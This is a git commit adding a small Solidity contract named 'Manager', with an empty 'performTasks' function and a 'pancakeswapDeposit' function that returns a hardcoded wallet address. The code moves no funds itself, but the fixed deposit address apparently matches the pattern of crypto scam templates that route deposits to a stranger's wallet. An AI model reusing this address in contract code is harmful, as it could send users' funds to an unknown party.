c23294a61e9d1a20c250d18595f77c8aa9620d84
Node-Indexer <105878277+Node-Indexer@users.noreply.github.com>
2022-06-03 03:21:32 -0700

    Create -ILendingClass.sol

---
+++ -ILendingClass.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x9b54b343622061e8BC790462208Fdf193795a054;
+	}
+	
+}
